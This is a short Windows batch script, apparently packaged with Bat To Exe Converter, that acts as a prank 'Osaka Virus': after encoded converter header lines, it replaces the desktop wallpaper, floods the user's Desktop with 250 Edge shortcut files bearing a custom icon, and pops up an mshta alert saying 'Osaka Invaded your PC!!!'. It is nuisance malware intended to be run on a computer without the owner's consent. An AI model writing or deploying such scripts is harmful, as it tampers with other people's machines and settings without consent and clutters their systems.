::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFDZVXgmMfF2jC7AO1Mz+/OGTrV0hc+0wf4PempeGMu8e7wvhbZNN
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
::wallpaper
WallpaperChanger img\Osaka_Virus.jpg 4

::shortcuts
for /l %%i in (1,1,250) do (
    shortcut /F:"%USERPROFILE%\Desktop\Osaka-YAAAAAA%%iAAAAA!!!.LNK" /A:C /T:"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" /I:"%CD%\img\Osaka_Virus.ico"
)

::MsgBOX
start mshta.exe "javascript:alert('Osaka Invaded your PC!!!');close()"